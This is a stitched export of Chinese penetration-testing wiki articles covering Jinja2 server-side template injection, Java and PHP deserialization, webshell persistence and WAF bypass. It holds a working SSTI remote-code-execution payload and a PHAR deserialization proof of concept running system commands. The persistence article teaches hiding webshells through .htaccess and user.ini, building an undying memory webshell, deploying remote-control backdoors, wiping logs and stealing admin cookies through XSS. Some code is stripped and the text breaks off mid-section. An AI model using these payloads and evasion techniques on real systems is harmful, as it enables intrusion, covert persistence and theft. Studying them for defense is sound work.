模板注入基本原理 靶场环境 模板用法 变量 创建一个内部的作用域 if 语句 for 循环 利用方法 对象的魔术方法 payload paylaod 分析 其他环境 参考链接 定义 SSTi(Server Side Template Injection)，服务端模板注入，它主要利用的是模板引擎将攻击者构造的payload在服务端按代码语义解析执行，然后加载在模板文件中(可以是HTML，也可以是模板可解析的特定后缀)，最后渲染到web页面上。 一些知识点 什么是模板/模板引擎？ 目前主流的web开发主要分为以下两种技术： 前后端不分离：即后端完成路由，用户在浏览器输入一个url，访问的是后端路由（服务端响应），后端接收请求后，再将数据通过模板引擎解析再渲染成视图返回给前端。后端路由，由后端渲染数据，再返回视图给前端，前端只负责展示视图，所有的交互都在后台 前后端分离：前端使用JavaScript框架，如(jquery，vue，react，angular)，前端项目化；后端去掉所有的视图，只提供api接口，用户在浏览器访问的路由为前端路由（也称为Hash路由，由前端响应），只加载前端视图，数据只通过ajax获取，前端获取数据之后再渲染到视图，前端负责控制路由，展示视图，后端只负责提供api，用户和视图交互，视图上的按钮以及页面数据和后端api交互 模板可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是用脚本语言的字符串拼接html，然后统一输出。 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，就是将模板文件和数据通过模板引擎生成一个HTML代码。 流程如下所示： 视图(view)： {{title}} This page took {{microtime(true) - time}} seconds to render. 后端逻辑(Controller)：后端将数据绑定绑定好交给模板引擎解析，完成前端页面的渲染 $templateEngine = new TemplateEngine(); $tpl = $templateEngine->loadFile(login.tpl); $tpl->assign('title','Login'); $tpl->assign('method','post'); $tpl->assign('action','login.php'); $tpl->assign('username',getUserNameFromCookie()); $tpl->assign('time',microtime(true)); $tmp->show(); 模板注入基本原理 通过模板，Web应用可以把输入经过模板解析转换成特定字符显示在HTML文件,这里以一个简单的例子来说明，如下，将客户端传来的name经过模板解析，然后将渲染好的值返回给前端 靶场环境 这里选择python3 + flask + jinja2 作为靶场环境 from flask import Flask, request from jinja2 import Template app = Flask(__name__) @app.route('/') def index(): name = request.args.get('name', 'guest') t = Template(\"Hello \" + name) return t.render() if __name__ == \"__main__\": app.run() 正常请求如下，服务端解析字符之后，就和前面的Hello拼接起来，然后呈现给前端 那么如果利用模板语法呢？（这里只针对jinja2做测试） {{7*7}} 我们可以调试看一下，在调用gensrate 之前，source在经过上一层parse函数解析之后，已经将需要渲染的内容变成了Template(body=[Output(nodes=[TemplateData(data='Hello '), Mul(left=Const(value=7), right=Const(value=7))])]) 继续单步向下，可以看到模板引擎已经将其解析成代码了 这个调试有点复杂，在生成代码之后，然后再代码执行（代码执行的函数为from_code） 那么只需要根据模板语法来构造payload就可以完成代码执行了，但是也并不是任意代码执行的,需要满足引擎渲染的表达式，来构造代码 模板用法 {{ ... }}：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。 {% ... %}：装载一个控制语句。 {# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值 变量 在模板中添加变量，可以使用（set）语句 {% set name='xx' %} 创建一个内部的作用域 with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效 {% with gg = 42 %} {{ gg }} {% endwith %} if 语句 {% if 1==1 %} {{ 7*7 }} {%else%} {{ 8*8 }} {% endif %} for 循环 {% for c in ['1','2','3'] %} {{c}} {%endfor%} 利用方法 Flask使用Jinja2这个渲染引擎，结合python代码来看，主要是通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类–>寻找子类–>找关于命令执行或者文件操作的模块 对象的魔术方法 __class__ 返回示例所属的类 __mro__ 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回一个类所继承的基类 # __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 payload %7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D paylaod 分析 使用for表达式来获取eval函数(只针对flask)，使用eval函数加载恶意执行代码 for c in [].__class__.__base__.__subclasses__(): if c.__name__ == 'catch_warnings': for b in c.__init__.__globals__.values(): if b.__class__ == {}.__class__: if 'eval' in b.keys(): print(b['eval']('__import__(\"os\").popen(\"id\").read()')) 以上代码改写为模板语法如下：满足模板语法，通过寻找list的基类中可用的引用列表，当其满足是字典的时候，存在eval方法，直接执行代码 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 其他环境 环境地址 备注 https://vulhub.org/#/environments/flask/ssti/ vulhub https://portswigger.net/web-security/all-labs burp官方靶场 参考链接 https://blog.csdn.net/qq_43431158/article/details/105322894 https://blog.csdn.net/u011377996/article/details/86776181 https://portswigger.net/web-security/server-side-template-injection https://vulhub.org/#/environments/flask/ssti/ https://blog.csdn.net/new_abc/article/details/48091721 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:02:49 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/08.SSTI/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/09.反序列化/Java序列化与反序列化.html":{"url":"知识库/01.WEB安全/09.反序列化/Java序列化与反序列化.html","title":"Java序列化与反序列化","keywords":"","body":" Java 序列化和反序列化 介绍 什么是序列化和反序列化 序列化要求 其他 序列化步骤 反序列化步骤 代码举例 序列化和反序列化 --> 文件 序列化和反序列化 --> bytes数组 序列化特征 安全性 反序列化漏洞的攻击流程 漏洞挖掘 Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 **implements Serializable** 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 需要注意的是，实现 readObject/writeObject 方法一定需要private 私有化，否则会找不到自定义的方法，从而使用ObjectOutputStream中的readObject方法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:12:15 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/09.反序列化/Java序列化与反序列化.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/09.反序列化/PHP反序列化.html":{"url":"知识库/01.WEB安全/09.反序列化/PHP反序列化.html","title":"PHP反序列化","keywords":"","body":" 简介 概念 原理 魔术方法 __construtor __destruct __toString __sleep __wakeup 例子 PHAR 参考链接 简介 php反序列化基本上是围绕着serialize()，unserialize()两个函数展开的，还有PHAR协议用于解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化。那么什么是序列化呢？序列化就是将一个对象变成可以传输的字符串，而反序列化其实就是将序列化得到的字符串再转变成对象。 首先上例子： 我们先讲简单的json序列化/反序列化，json格式就是一种序列化，虽然序列化json和php的反序列化漏洞无直接的联系，但是在理解反序列化这个概念会有所帮助 json_encode() json_decode() 'test_1','book_2' => 'test_2','book_3' => 'test_3', 'book_4' => 'test_4'); $json = json_encode($book); echo $json; ?> 在这里我们有一个book数组，如果需要传输这个数组，我们可以利用json_encode()函数将这个数据序列化成一串字符串，以key-value的形式展示出来 'book_1' => 'test_1', 'book_2' => 'test_2', 'book_3' => 'test_3', 'book_4' => 'test_4' 所以我们将数组序列化成json格式的字符串的目的就是为了方便传输，我们可以看见，这里json格式来保存数据主要是使用键值对格式来保存的。 json格式只是为了传输数据而出现的，那么我们讲反序列化漏洞的话，就需要将字符串反序列化成对象。 概念 在这里我写一个class，在这个class中存有一些变量，当这个class被实例化之后，在使用过程中，里面的一些变量发生了改变，当如果以后某些时候还会用到这个变量，如果我们让这个class一直不销毁，就会浪费系统资源。如果我们将这个对象序列化，将其保存成一个字符串，当你需要使用的时候，再将其反序列化为对象就可以了。 name = \"aaron\"; $example->sex = \"woman\"; $example->age = 22; echo serialize($example); ?> 在这里，我们首先创建了一个DemoClass，里面存了一些数据，然后我们实例化了一个对象，并将这个对象里的信息改变了，当我们还需要使用这个实例的话，就将序列化（serialize）后的字符串存起来，需要使用的时候再反序列化（unserialize）出来就可以了 我们可以看一下结果 这个时候，序列化对象出来的格式和json格式不一样 O:9:\"DemoClass\":3:{s:4:\"name\";s:5:\"aaron\";s:3:\"sex\";s:5:\"woman\";s:3:\"age\";i:22;} // O 表示 object，这里还有一个情况是A，A表示是Array表示数组 // O:9 这个9 表示对象名表示占9个字符 // O:9:\"DemoClass\":3 这个3 表示是对象里有三个变量 // {s:4:\"name\";s:5:\"aaron\";} s=> 表示String 类型格式，s:4 4=>表示变量名占4位(name)，s:5表示name的值(aaron)是String类型格式，且占5位 // i => 表示是int类型格式，后面直接跟数据 // d => 表示double类型格式 然后如果反序列化（unserialize）回来 name = \"aaron\"; $example->sex = \"woman\"; $example->age = 21; $val = serialize($example); $x = unserialize($val); echo $x->name; ?> 原理 php里的魔术方法，通常因为某些条件而触发，不需要手动调用，我理解的是钩子函数吧，也就是生命周期的概念。 魔术方法 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep() //在对象在被序列化之前运行 __wakeup //在对象被反序列化时被调用 理解这几个魔术函数，如果php接收我们反序列化的字符串，且在魔术方法中能够直接执行我们构造的payload，就会造成反序列化漏洞 看一个简单的例子： test; } } $a = $_GET['test']; $a_unser = unserialize($a); ?> 这里表示是我们传入test参数，然后在反序列化成对象，然后在其生命周期当这个反序列化生成的对象要被销毁的时候调用echo 方法，输出test参数 那么我们构造如下payload O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} test参数可控的情况下，就会输出hello,world 我们在来尝试不同的生命周期 __construtor 在这里，construct是处于创建对象的生命周期中，当创建对象的时候会调用该函数，这里要被利用的话，需要配合另一个Class，这里先用__wakeup在被反序列化时，new一个新的对象A，并传入参数，这里表示test参数可控的情况下，当test参数可控，并在反序列化后，将test参数传入A的新实例中，那么只要constructor中存在可执行代码或者执行命令的函数，那么造成影响 \"; echo $test; } } class B{ public $test_1 = \"\"; function __wakeup(){ $obj = new A($this->test_1); } } $a = $_GET['test']; echo $a; $a_unser = unserialize($a); new A(\"123\"); ?> O:1:\"B\":1:{s:6:\"test_1\";s:11:\"hello,world\";} __destruct 在这里，destruct处于对象被销毁的生命周期，当实例化之后，当对该对象的操作完成之后，那么php的回收机制则会回收该对象，这里就会调用该钩子函数，这里表示test参数可控的情况下，并在反序列化后之后，再打印该值，那么只要destruct中存在可执行代码或者执行命令的函数，那么就会造成影响 \"; echo $this->test; } } $a = $_GET['test']; echo $a; $a_unser = unserialize($a); ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} __toString 在这里，toString处于当需要将对象输出的生命周期，当反序列化之后，需要输出对象并将其值用作上下文中使用，那么将对调用该钩子函数，当$test参数可控的情况下，在反序列化之后形成对象时，如果需要输出该对象，那么只要toString方法中存在可执行代码或者命令的函数，那么就会造成影响 \"; return $this->test; } } $a = $_GET['test']; echo $a; echo \"\"; $a_unser = unserialize($a); echo $a_unser; ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} __sleep 在这里，sleep处于当需要序列化对象的生命周期，在序列化之前，存在该钩子，则会返回一个包含对象中所有应被序列化的变量名称的数组，当$test参数可控的情况下，在序列化之后形成字符串时，那么只要sleep方法中存在可执行代码或者命令的函数，那么就会造成影响 test = $test; } function __sleep(){ echo \"__sleep()\"; echo $this->test; echo \"\"; return array('test'); } } class B{ public $test_1 = \"\"; function __wakeup(){ $obj = new A($this->test_1); echo serialize($obj); } } $a = $_GET['test']; echo $a,\"\"; $a_unser = unserialize($a); ?> O:1:\"B\":1:{s:6:\"test_1\";s:11:\"hello,world\";} __wakeup 在这里wakeup 是字符串反序列化的时候，会调用该钩子函数，只要执行unserialize方法就会触发该方法，其实我们关注php反序列化漏洞特别需要关注的魔术方法应该是`wakeup，destruct，因为这两个方法只要在反序列化过程中一定会用到的，尤其是__wakeup` test = $test; } function __wakeup(){ echo \"__wakeup()\"; echo $this->test; } } $a = $_GET['test']; echo $a,\"\"; $a_unser = unserialize($a); ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} 例子 file = $file; } function readfile() { if (!empty($this->file) && stripos($this->file,'..')===FALSE && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) { return @file_get_contents($this->file); } else{ echo \"false\"; } } } $x = new A(); isset($_GET['test']) && $g = $_GET['test']; if (!empty($g)) { echo $g,\"\"; $x = unserialize($g); } echo $x->readfile(); ?> 在这里，当实例化之前，调用construt魔术方法，如果未给file传值，那么file默认为空，如果test参数为空，则不输出文件，那么要输出文件内容则需要置参数不为空，其需要将参数反序列化，最后再调用反序列化后对象的readfile函数，并在这个对象实例中必须得存在file值，所以在这里构造反序列化字符串，但是在readfile里也有限制，不能使用相对路径，也不能带绝对路径，只能访问当前目录的文件 O:1:\"A\":1:{s:4:\"file\";s:5:\"1.txt\";} PHAR output); } } file_get_contents($_GET[\"file\"]); 生成phar文件的poc output; } } @unlink(\"phar.phar\"); $phar = new Phar('phar.phar'); $phar -> stopBuffering(); $phar -> setStub('GIF89a'.''); $phar -> addFromString('test.txt','test'); $object = new AnyClass(); $object -> output= 'system(\"whoami\");'; $phar -> setMetadata($object); $phar -> stopBuffering(); 参考链接 https://www.freebuf.com/articles/web/167721.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:02:25 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/09.反序列化/PHP反序列化.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/10.权限维持/Web_权限维持.html":{"url":"知识库/01.WEB安全/10.权限维持/Web_权限维持.html","title":"Web_权限维持","keywords":"","body":" 前言 隐藏webshell .htaccess SetHandler AddHandler .htaccess本身 user.ini && htaccess 自动包含 构建漏洞页面 404页面、文件上传其他功能性页面 注释马 内存马 PHP JAVA Servlet JAVA Spring Linux远控 BlueShell tsh 其他tips 参考资料 前言 在实战渗透中，经常需要上传webshell来完成对目标的权限维持。通过各种方法来构造一个免杀的webshell后门来实现webshell层面的权限维持是大家比较通用的方法，但是除了简单粗暴的写php免杀马，实战中还有一些小技巧值得去学习，毕竟除了要绕过各种waf的防护，还需要绕过“人肉waf“ 管理员的火眼金睛，大体分为webshell隐藏和构建漏洞页面 隐藏webshell 隐藏webshell是web层维持权限的基本方法，但是如果直接写php文件，哪怕是源码免杀，也很容易被管理员发现，因此，利用Apache的解析机制来将webshell源码写入其他非php格式的文件（png、jpeg、.vim、Thumb.db、css、init、.tmp等文件），再配合include、require等函数嵌套使用，基本很难被发现。 .htaccess .htaccess文件是apache服务器的一种目录级别的修改配置的方式，可以用来配置当前目录及其所有子目录，常常被用于访问URL时重写路径； 开启htaccess： 打开apache 配置文件httpd.conf，将LoadModule rewrite_module modules/mod_rewrite.so的注释去掉， 同时确定 AllowOverride的参数若为All：AllowOverride ALL，None表示忽略 .htaccess文件：AllowOverride None， 简单测试方法：就是查看网站根目录下有没有htaccess文件，有的话说明可以使用htaccess文件。 值得注意的是，子目录下的htaccess文件不受父目录的htaccess文件影响，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 SetHandler SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。 SetHandler application/x-httpd-php 将图片马123.jpeg 当做 php 执行 SetHandler application/x-httpd-php AddHandler AddHandler 指令可以实现在文件扩展名与特定的处理器之间建立映射。 #将.jpg 当做 php 文件解析 AddType application/x-httpd-php .png #最好是设置一个独特的后缀，防止同目录下的其他文件解析错误 #比如照片格式：jpeg 、icon、ico、Thumbs.db .htaccess本身 默认情况下是无法访问.htaccess文件的，需要修改访问的权限 Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php # # 注释内就是需要执行的php代码 user.ini && htaccess 自动包含 user.ini 和.htaccess都可以使两种配置模式生效：PHP_INI_PREDIR和PHP_INI_ALL 使用文件包含的两个相关配置 auto_prepend_file：指定一个文件，在主文件解析之前自动解析 auto_append_file：指定一个文件，在主文件解析后自动解析 user.ini 内容为 auto_prepend_file=test.png # 或者 auto_append_file=test.png 条件：php5.3+ && NTS 版本 构建漏洞页面 404页面、文件上传其他功能性页面 404页面 404 Not Found Not Found The requested URL was not found on this server. #构造代码执行 #文件上传 \";}?> 注释马 适用于具有修改网站php文件权限的时候，非常好用的一个技巧 getDocComment()), 7, 12);//然后去截断获取注释里的字符,注意getDocComment只能通过文件最开始的类来调用才会把注释内容显示 //echo $zhushi; $zhushi = base64_decode($zhushi); $zhushi = substr($zhushi, 0, 6); echo $zhushi; foreach (array('_POST','_GET') as $_request) { foreach ($$_request as $_key=>$_value) { $$_key= $_value; print_r($$_request); } } /*设置一个数组，参数为_POST,_GET,然后把该数组用$_request去表示，再设置一个遍历，把$_request设为一个可变变量，再键值分离 再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容 */ $zhushi($_value); //最后就是assert(传入的变量值) ?> 内存马 内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐 PHP php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。 '; file_put_contents(\"22.php\", $content); usleep(10000); } ?> 函数说明： ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。 set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。 unlink(FILE)函数：删除文件。 file_put_contents函数：将一个字符串写入文件。 usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒） 访问该文件，则会生成22.php，并立马删除该文件 对于此类webshell，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了 JAVA Servlet JAVA Spring Linux远控 webshell能做的隐藏手段其实非常有限，因为http协议流量也很容易被监控。相比之Linux远控，因为体积小、通信走的是TCP或者DNS流量，在Linux环境下比传统的webshell更隐蔽，也更方便。也可以直接用C2接管 BlueShell # 项目地址 git clone https://github.com/whitehatnote/BlueShell # 编译 # 可以自己编译客户端以及服务端，不过要注意go版本问题 # 生成bsClient go get github.com/armon/go-socks5 go get github.com/creack/pty go get github.com/hashicorp/yamux go build --ldflags \"-s -w \" -o bsClient client.go # 生成bsServer go get github.com/creack/pty go get github.com/hashicorp/yamux go get github.com/djimenez/iconv-go go get golang.org/x/crypto/ssh/terminal go build --ldflags \"-s -w \" -o bsServer server.go tsh 项目地址：https://github.com/creaktive/tsh 可以说是其他linux远控鼻祖了，非常方便，可以伪造进程名、加密流量，非常简单实用 其他tips xss，在后台页面写入一个xss，来获取管理员cookie，相对php文件说较为隐蔽 写一个仅有上传功能的php文件，不包含eval等敏感函数 centos 可以创建空文件夹+.php文件，ls命令下是看不见的 清理痕迹,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除。（一般需要root权限） 把webshell的属性时间改为和同目录文件相同的时间戳 隐藏在插件目录,主题目录,编辑器的图片目录以及一些临时目录，注意能不能直接访问，不能的话参考上面的htaccess文件修改目录访问权限 项目尽量避免使用大马，哪怕是加密的大马也不行，痕迹太多了！ 同时上传几个备用webshell,可以的话，用不同的ip和user-agent去备份webshell 项目列表在有权限的情况,尝试其他方法，比如php拓展后门、apache后门参考资料 https://zhuanlan.zhihu.com/p/434990950 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:14:39 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/10.权限维持/Web_权限维持.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/01.WAF绕过通用思路.html":{"url":"知识库/01.WEB安全/11.其他/01.WAF绕过通用思路.html","title":"01.WAF绕过通用思路","keywords":"","body":" 概述 大小写 双写 编码 注释 垃圾字符 分块传输 HTTP协议绕过 HTTP 0.9 参数污染（HPP） Pipeline（keep-alive） HTTP charset WAF特性 云WAF绕过 白名单绕过 静态文件绕过 Content-Type绕过 请求方式绕过 解析兼容性 容器特性 参考 概述 通用的方法，不仅限于SQL注入，就是万金油，无非就是大小写、双写、编码、注释、垃圾字符、分块传输、HPP、WAF特性等 核心：所有能改的地方，都捣鼓捣鼓改改，增加就加，能删就删，多拿点其他内容来混淆视听。 大小写 unIoN Select 双写 一些后端可能会直接给关键词过滤为空，那么就可以利用双写来绕过 ununionion ==> 去掉union ==> union 编码 URL编码 Unicode编码 十六进制编码 其他后端会解析的编码注释 如mysql中的内联注释，可以用来代替空格 注释也可以和换行搭配使用，注释掉后面的内容，再通过换行逃逸到注释之外test.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2 垃圾字符 一些WAF设置了过滤的数据包长度，如果数据包太大太长，为了考虑性能就会直接略过这个数据包GET /foo?sqli=111...80万个1...111'+and+2*3=6+--+ HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 分块传输 burp插件：https://github.com/c0ny1/chunked-coding-converter.git 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。HTTP协议绕过 HTTP 0.9 HTTP 